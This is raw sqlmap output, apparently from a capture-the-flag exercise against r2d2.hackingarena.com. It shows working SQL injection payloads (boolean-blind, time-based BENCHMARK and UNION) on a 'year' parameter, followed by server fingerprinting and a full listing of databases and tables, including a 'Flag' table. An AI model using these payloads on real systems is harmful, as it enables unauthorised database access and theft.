sqlmap identified the following injection point(s) with a total of 473 HTTP(s) requests:
---
Parameter: year (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: year=1964 AND 6714=6714&vocal=2&album=3

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: year=1964 AND 6388=BENCHMARK(5000000,MD5(0x50647a50))&vocal=2&album=3

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: year=1964 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71627a6271,0x4e72576a6a435846675854656c756b55535246466948476c514d70746e68716f6275624e556c4578,0x7171626b71),NULL,NULL-- -&vocal=2&album=3
---
[13:51:09] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL < 5.0.12
[13:51:09] [INFO] fetching current database
current database: 'BeatlesData'
[13:51:10] [INFO] fetching database names
[13:51:10] [INFO] fetching tables for databases: 'BeatlesData, information_schema, mysql, performance_schema, sys'
Database: information_schema
[61 tables]
+------------------------------------------------------+
| CHARACTER_SETS                                       |
| COLLATIONS                                           |
| COLLATION_CHARACTER_SET_APPLICABILITY                |
| COLUMN_PRIVILEGES                                    |
| FILES                                                |
| GLOBAL_STATUS                                        |
| GLOBAL_VARIABLES                                     |
| INNODB_BUFFER_PAGE                                   |
| INNODB_BUFFER_PAGE_LRU                               |
| INNODB_BUFFER_POOL_STATS                             |
| INNODB_CMP                                           |
| INNODB_CMPMEM                                        |
| INNODB_CMPMEM_RESET                                  |
| INNODB_CMP_PER_INDEX                                 |
| INNODB_CMP_PER_INDEX_RESET                           |
| INNODB_CMP_RESET                                     |
| INNODB_FT_BEING_DELETED                              |
| INNODB_FT_CONFIG                                     |
| INNODB_FT_DEFAULT_STOPWORD                           |
| INNODB_FT_DELETED                                    |
| INNODB_FT_INDEX_CACHE                                |
| INNODB_FT_INDEX_TABLE                                |
| INNODB_LOCKS                                         |
| INNODB_LOCK_WAITS                                    |
| INNODB_METRICS                                       |
| INNODB_SYS_COLUMNS                                   |
| INNODB_SYS_DATAFILES                                 |
| INNODB_SYS_FIELDS                                    |
| INNODB_SYS_FOREIGN                                   |
| INNODB_SYS_FOREIGN_COLS                              |
| INNODB_SYS_INDEXES                                   |
| INNODB_SYS_TABLES                                    |
| INNODB_SYS_TABLESPACES                               |
| INNODB_SYS_TABLESTATS                                |
| INNODB_SYS_VIRTUAL                                   |
| INNODB_TEMP_TABLE_INFO                               |
| INNODB_TRX                                           |
| KEY_COLUMN_USAGE                                     |
| OPTIMIZER_TRACE                                      |
| PARAMETERS                                           |
| PROFILING                                            |
| REFERENTIAL_CONSTRAINTS                              |
| ROUTINES                                             |
| SCHEMATA                                             |
| SCHEMA_PRIVILEGES                                    |
| SESSION_STATUS                                       |
| SESSION_VARIABLES                                    |
| STATISTICS                                           |
| TABLESPACES                                          |
| TABLE_CONSTRAINTS                                    |
| TABLE_PRIVILEGES                                     |
| USER_PRIVILEGES                                      |
| VIEWS                                                |
| COLUMNS                                              |
| ENGINES                                              |
| EVENTS                                               |
| PARTITIONS                                           |
| PLUGINS                                              |
| PROCESSLIST                                          |
| TABLES                                               |
| TRIGGERS                                             |
+------------------------------------------------------+

Database: BeatlesData
[3 tables]
+------------------------------------------------------+
| Flag                                                 |
| Song                                                 |
| Event                                                |
+------------------------------------------------------+

Database: mysql
[31 tables]
+------------------------------------------------------+
| event                                                |
| plugin                                               |
| user                                                 |
| columns_priv                                         |
| db                                                   |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| ndb_binlog_index                                     |
| proc                                                 |
| procs_priv                                           |
| proxies_priv                                         |
| server_cost                                          |
| servers                                              |
| slave_master_info                                    |
| slave_relay_log_info                                 |
| slave_worker_info                                    |
| slow_log                                             |
| tables_priv                                          |
| time_zone                                            |
| time_zone_leap_second                                |
| time_zone_name                                       |
| time_zone_transition                                 |
| time_zone_transition_type                            |
+------------------------------------------------------+

Database: performance_schema
[88 tables]
+------------------------------------------------------+
| hosts                                                |
| processlist                                          |
| accounts                                             |
| cond_instances                                       |
| events_stages_current                                |
| events_stages_history                                |
| events_stages_history_long                           |
| events_stages_summary_by_account_by_event_name       |
| events_stages_summary_by_host_by_event_name          |
| events_stages_summary_by_thread_by_event_name        |
| events_stages_summary_by_user_by_event_name          |
| events_stages_summary_global_by_event_name           |
| events_statements_current                            |
| events_statements_history                            |
| events_statements_history_long                       |
| events_statements_summary_by_account_by_event_name   |
| events_statements_summary_by_digest                  |
| events_statements_summary_by_host_by_event_name      |
| events_statements_summary_by_program                 |
| events_statements_summary_by_thread_by_event_name    |
| events_statements_summary_by_user_by_event_name      |
| events_statements_summary_global_by_event_name       |
| events_transactions_current                          |
| events_transactions_history                          |
| events_transactions_history_long                     |
| events_transactions_summary_by_account_by_event_name |
| events_transactions_summary_by_host_by_event_name    |
| events_transactions_summary_by_thread_by_event_name  |
| events_transactions_summary_by_user_by_event_name    |
| events_transactions_summary_global_by_event_name     |
| events_waits_current                                 |
| events_waits_history                                 |
| events_waits_history_long                            |
| events_waits_summary_by_account_by_event_name        |
| events_waits_summary_by_host_by_event_name           |
| events_waits_summary_by_instance                     |
| events_waits_summary_by_thread_by_event_name         |
| events_waits_summary_by_user_by_event_name           |
| events_waits_summary_global_by_event_name            |
| file_instances                                       |
| file_summary_by_event_name                           |
| file_summary_by_instance                             |
| global_status                                        |
| global_variables                                     |
| host_cache                                           |
| memory_summary_by_account_by_event_name              |
| memory_summary_by_host_by_event_name                 |
| memory_summary_by_thread_by_event_name               |
| memory_summary_by_user_by_event_name                 |
| memory_summary_global_by_event_name                  |
| metadata_locks                                       |
| mutex_instances                                      |
| objects_summary_global_by_type                       |
| performance_timers                                   |
| prepared_statements_instances                        |
| replication_applier_configuration                    |
| replication_applier_status                           |
| replication_applier_status_by_coordinator            |
| replication_applier_status_by_worker                 |
| replication_connection_configuration                 |
| replication_connection_status                        |
| replication_group_member_stats                       |
| replication_group_members                            |
| rwlock_instances                                     |
| session_account_connect_attrs                        |
| session_connect_attrs                                |
| session_status                                       |
| session_variables                                    |
| setup_actors                                         |
| setup_consumers                                      |
| setup_instruments                                    |
| setup_objects                                        |
| setup_timers                                         |
| socket_instances                                     |
| socket_summary_by_event_name                         |
| socket_summary_by_instance                           |
| status_by_account                                    |
| status_by_host                                       |
| status_by_thread                                     |
| status_by_user                                       |
| table_handles                                        |
| table_io_waits_summary_by_index_usage                |
| table_io_waits_summary_by_table                      |
| table_lock_waits_summary_by_table                    |
| threads                                              |
| user_variables_by_thread                             |
| users                                                |
| variables_by_thread                                  |
+------------------------------------------------------+

Database: sys
[101 tables]
+------------------------------------------------------+
| processlist                                          |
| session                                              |
| version                                              |
| host_summary                                         |
| host_summary_by_file_io                              |
| host_summary_by_file_io_type                         |
| host_summary_by_stages                               |
| host_summary_by_statement_latency                    |
| host_summary_by_statement_type                       |
| innodb_buffer_stats_by_schema                        |
| innodb_buffer_stats_by_table                         |
| innodb_lock_waits                                    |
| io_by_thread_by_latency                              |
| io_global_by_file_by_bytes                           |
| io_global_by_file_by_latency                         |
| io_global_by_wait_by_bytes                           |
| io_global_by_wait_by_latency                         |
| latest_file_io                                       |
| memory_by_host_by_current_bytes                      |
| memory_by_thread_by_current_bytes                    |
| memory_by_user_by_current_bytes                      |
| memory_global_by_current_bytes                       |
| memory_global_total                                  |
| metrics                                              |
| ps_check_lost_instrumentation                        |
| schema_auto_increment_columns                        |
| schema_index_statistics                              |
| schema_object_overview                               |
| schema_redundant_indexes                             |
| schema_table_lock_waits                              |
| schema_table_statistics                              |
| schema_table_statistics_with_buffer                  |
| schema_tables_with_full_table_scans                  |
| schema_unused_indexes                                |
| session_ssl_status                                   |
| statement_analysis                                   |
| statements_with_errors_or_warnings                   |
| statements_with_full_table_scans                     |
| statements_with_runtimes_in_95th_percentile          |
| statements_with_sorting                              |
| statements_with_temp_tables                          |
| sys_config                                           |
| user_summary                                         |
| user_summary_by_file_io                              |
| user_summary_by_file_io_type                         |
| user_summary_by_stages                               |
| user_summary_by_statement_latency                    |
| user_summary_by_statement_type                       |
| wait_classes_global_by_avg_latency                   |
| wait_classes_global_by_latency                       |
| waits_by_host_by_latency                             |
| waits_by_user_by_latency                             |
| waits_global_by_latency                              |
| x$host_summary                                       |
| x$host_summary_by_file_io                            |
| x$host_summary_by_file_io_type                       |
| x$host_summary_by_stages                             |
| x$host_summary_by_statement_latency                  |
| x$host_summary_by_statement_type                     |
| x$innodb_buffer_stats_by_schema                      |
| x$innodb_buffer_stats_by_table                       |
| x$innodb_lock_waits                                  |
| x$io_by_thread_by_latency                            |
| x$io_global_by_file_by_bytes                         |
| x$io_global_by_file_by_latency                       |
| x$io_global_by_wait_by_bytes                         |
| x$io_global_by_wait_by_latency                       |
| x$latest_file_io                                     |
| x$memory_by_host_by_current_bytes                    |
| x$memory_by_thread_by_current_bytes                  |
| x$memory_by_user_by_current_bytes                    |
| x$memory_global_by_current_bytes                     |
| x$memory_global_total                                |
| x$processlist                                        |
| x$ps_digest_95th_percentile_by_avg_us                |
| x$ps_digest_avg_latency_distribution                 |
| x$ps_schema_table_statistics_io                      |
| x$schema_flattened_keys                              |
| x$schema_index_statistics                            |
| x$schema_table_lock_waits                            |
| x$schema_table_statistics                            |
| x$schema_table_statistics_with_buffer                |
| x$schema_tables_with_full_table_scans                |
| x$session                                            |
| x$statement_analysis                                 |
| x$statements_with_errors_or_warnings                 |
| x$statements_with_full_table_scans                   |
| x$statements_with_runtimes_in_95th_percentile        |
| x$statements_with_sorting                            |
| x$statements_with_temp_tables                        |
| x$user_summary                                       |
| x$user_summary_by_file_io                            |
| x$user_summary_by_file_io_type                       |
| x$user_summary_by_stages                             |
| x$user_summary_by_statement_latency                  |
| x$user_summary_by_statement_type                     |
| x$wait_classes_global_by_avg_latency                 |
| x$wait_classes_global_by_latency                     |
| x$waits_by_host_by_latency                           |
| x$waits_by_user_by_latency                           |
| x$waits_global_by_latency                            |
+------------------------------------------------------+

[13:51:10] [INFO] fetched data logged to text files under '/Users/havardnyboe/.local/share/sqlmap/output/r2d2.hackingarena.com'

[*] ending @ 13:51:10 /2023-11-10/